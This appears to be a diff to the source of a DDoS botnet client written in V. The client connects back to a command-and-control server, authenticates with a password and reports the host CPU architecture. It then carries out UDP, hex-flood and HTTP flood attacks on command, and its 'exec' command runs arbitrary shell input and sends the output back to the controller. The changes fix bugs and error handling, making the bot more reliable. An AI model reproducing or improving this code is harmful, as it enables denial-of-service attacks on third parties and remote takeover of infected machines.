@@ -16,7 +16,7 @@ fn C.sendHTTP(&char, int)
 fn main() {
 	mut args := os.args.clone()
 	if args.len < 4 {
-		logger.conosle_log("invalid_arguments", "arguments provided!\n${args[0]} <ip> <port> <bot_pw>", true)
+		logger.console_log("invalid_arguments", "arguments provided!\n${args[0]} <ip> <port> <bot_pw>", true)
 		exit(0)
 	}
 	mut s := go server(args[1], args[2], args[3])
@@ -30,52 +30,53 @@ fn main() {
 fn server(ip string, port string, pw string) { 
 	mut server := net.dial_tcp("${ip}:${port}") or {
 		logger.console_log("hosting_err", "Unable to connect to the server....", true)
-		exit(0)
+		return
 	}
 
 	server.set_read_timeout(time.infinite)
 
 	mut reader := io.new_buffered_reader(reader: server)
-	server.write_string("${pw}\n") or { 0 } // Send PW
+	server.write_string("${pw}\n") or { return } // Send PW
 	time.sleep(1*time.second)
 
-	server.write_string((os.execute("lscpu | grep Architecture").output).replace("Architecture: ", "").trim_space() + "\n") or { 0 } // Send CPU ARCH
+	server.write_string((os.execute("lscpu | grep Architecture").output).replace("Architecture: ", "").trim_space() + "\n") or { return } // Send CPU ARCH
 	for {
-		mut data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
+		mut data := (reader.read_line() or { return }).replace("\r", "").replace("\n", "")
 		fcmd, cmd, args := parse_buffer(data)
 		if data.len > 2 {
 			match cmd {
 				"udpplain" {
-						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+					if args.len < 4 {
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
 					} else {
-						server.write_string("[ + ] Attack being sent....\n") or { 0 }
+						server.write_string("[ + ] Attack being sent....\n") or { return }
 						go send_udp(args[1], args[2].u16(), args[3].int())
-						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
+						server.write_string("[ + ] Attack Successfully finished....\n") or { return }
 					}
 				}
 				"stdhex" {
 					if args.len < 4 {
-						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
 					} else {
-						server.write_string("[ + ] Attack being sent....\n") or { 0 }
+						server.write_string("[ + ] Attack being sent....\n") or { return }
 						go send_std(args[1], args[2].int(), args[3].int())
-						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
+						server.write_string("[ + ] Attack Successfully finished....\n") or { return }
 					}
 				}
 				"http" {
 					if args.len < 3 {
-						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { return }
 					} else {
-						server.write_string("[ + ] Attack being sent....\n") or { 0 }
+						server.write_string("[ + ] Attack being sent....\n") or { return }
 						go send_http(args[1], args[2].int())
-						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
+						server.write_string("[ + ] Attack Successfully finished....\n") or { return }
 					}
 				}
 				"exec" {
-					server.write_string(os.execute("${data.replace("exec ", "")}").output) or { 0 }
+					server.write_string(os.execute("${data.replace("exec ", "")}").output) or { return }
 				} else { }
 			}
-			logger.conosle_log("bot_new_cmd", fcmd, false)
+			logger.console_log("bot_new_cmd", fcmd, false)
 		}
 	}
 }
